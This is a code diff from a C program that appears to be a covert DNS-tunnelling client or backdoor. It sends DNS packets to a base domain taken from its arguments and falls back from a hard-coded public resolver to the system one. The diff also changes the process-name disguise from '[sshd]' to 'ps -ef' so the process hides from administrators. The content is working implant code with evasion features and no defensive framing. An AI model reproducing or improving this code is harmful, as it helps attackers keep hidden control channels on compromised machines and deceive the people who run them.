@@ -152,13 +152,6 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    char dns_server_ip[255] = {0};
-    get_sys_nameserver(dns_server_ip, sizeof(dns_server_ip));
-    if(dns_server_ip[0] == 0)
-    {
-        strcpy(dns_server_ip, "114.114.114.114");
-    }
-
     //DNS包发送周期，在尝试连接建立阶段，周期为5分钟；连接建立成功后，周期改为1秒
     int dns_requst_send_period = 300;
 
@@ -169,16 +162,28 @@ int main(int argc, char *argv[])
     strcpy_s(g_baseDomain, 255, argv[1]);
 
     setproctitle_init(argc, argv, environ);
-    setproctitle("[sshd]");
+    setproctitle("ps -ef");
     
     signal(SIGCHLD, SIG_IGN);//防止僵尸进程
 
     clientid_sequid_init();
 
+    /* 优先连接114.114.114.114，如果不通连接本机/etc/resolve.conf中配置的DNS服务器
+    */
     int fd = udp_connect("114.114.114.114", 53);
     if(fd == -1)
     {
-        perror("udp connect fail");
+        char dns_server_ip[255] = {0};
+        get_sys_nameserver(dns_server_ip, sizeof(dns_server_ip));
+        if(dns_server_ip[0] != 0)
+        {
+            fd = udp_connect(dns_server_ip, 53);
+        }
+    }
+
+    if(fd == -1)
+    {
+        perror("udp connect DNS server fail");
         return 1;
     }
 
